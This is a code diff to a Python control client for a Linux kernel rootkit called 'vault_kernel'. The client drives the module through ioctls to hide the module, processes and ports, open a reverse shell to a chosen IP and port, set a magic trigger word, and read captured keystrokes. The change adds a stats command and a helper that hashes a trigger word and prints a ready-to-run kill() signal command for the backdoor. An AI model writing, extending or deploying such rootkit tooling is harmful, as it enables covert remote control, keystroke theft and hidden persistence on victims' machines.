@@ -66,9 +66,26 @@ IOCTL_BACKDOOR_SHELL  = _IOW(MAGIC, 0x0B, 256)
 IOCTL_BACKDOOR_MAGIC  = _IOW(MAGIC, 0x0C, 16)
 IOCTL_MODULE_HIDE     = _IO(MAGIC, 0x0D)
 IOCTL_MODULE_UNHIDE   = _IO(MAGIC, 0x0E)
+IOCTL_GET_STATS       = _IOR(MAGIC, 0x0F, 4096)
+
+MAGIC_SIGNAL = 35  # glibc SIGRTMIN(34) + 1 — matches MAGIC_SIGNAL in src/backdoor.c
 
 
-class RooteameClient:
+def fnv1a16(word: str) -> int:
+    """FNV-1a 32-bit folded to 16 bits — mirrors vault_fnv1a16() in src/backdoor.c."""
+    h = 0x811C9DC5
+    for byte in word.encode():
+        h ^= byte
+        h = (h * 0x01000193) & 0xFFFFFFFF
+    return ((h >> 16) ^ (h & 0xFFFF)) & 0xFFFF
+
+
+def magic_pid(word: str, port: int) -> int:
+    """Encode (port, word) into the fake PID for the kill() backdoor trigger."""
+    return (port << 16) | fnv1a16(word)
+
+
+class VaultKernelClient:
     def __init__(self):
         self.fd = None
 
@@ -248,6 +265,26 @@ class RooteameClient:
             print("[*] vault_kernel kernel module is NOT loaded")
             print(f"    Run: sudo insmod vault_kernel.ko")
 
+    def stats(self):
+        """Read module statistics via IOCTL_GET_STATS."""
+        self._open()
+        buf = bytearray(4096)
+        try:
+            fcntl.ioctl(self.fd, IOCTL_GET_STATS, buf)
+            output = buf.rstrip(b'\x00').decode(errors='replace')
+            print(output if output else "(no stats returned)")
+        except PermissionError:
+            print("[-] Permission denied. Run with sudo.")
+        self._close()
+
+    def magic_encode(self, word, port):
+        """Print the ready-to-run kill() incantation for word+port."""
+        encoded = magic_pid(word, port)
+        print(f"[*] Magic word : {word} (hash 0x{fnv1a16(word):04X})")
+        print(f"[*] Port       : {port}")
+        print(f"[*] Encoded PID: {encoded}")
+        print(f"[*] Trigger    : kill -s {MAGIC_SIGNAL} {encoded}")
+
 
 def main():
     parser = argparse.ArgumentParser(
@@ -282,12 +319,17 @@ def main():
     sp.add_argument("port", type=int, help="Port number")
 
     subparsers.add_parser("list", help="List all hidden items")
+    subparsers.add_parser("stats", help="Show module stats")
 
     sp = subparsers.add_parser("shell", help="Trigger reverse shell")
     sp.add_argument("target", help="IP:PORT for reverse shell")
 
     sp = subparsers.add_parser("magic", help="Set magic packet trigger word")
     sp.add_argument("word", help="Trigger word")
+
+    sp = subparsers.add_parser("magic-encode", help="Print the kill() trigger for word+port")
+    sp.add_argument("word", help="Trigger word")
+    sp.add_argument("port", type=int, help="Callback port")
 
     subparsers.add_parser("keylog", help="Read captured keystrokes")
     subparsers.add_parser("keylog-clear", help="Clear keylogger buffer")
@@ -303,7 +345,7 @@ def main():
     if os.geteuid() != 0:
         print("[!] Warning: not running as root. Some commands may fail.")
 
-    client = RooteameClient()
+    client = VaultKernelClient()
 
     try:
         if args.command == "status":
@@ -324,10 +366,14 @@ def main():
             client.unhide_port(args.port)
         elif args.command == "list":
             client.list_hidden()
+        elif args.command == "stats":
+            client.stats()
         elif args.command == "shell":
             client.shell(args.target)
         elif args.command == "magic":
             client.set_magic(args.word)
+        elif args.command == "magic-encode":
+            client.magic_encode(args.word, args.port)
         elif args.command == "keylog":
             client.keylog_read()
         elif args.command == "keylog-clear":
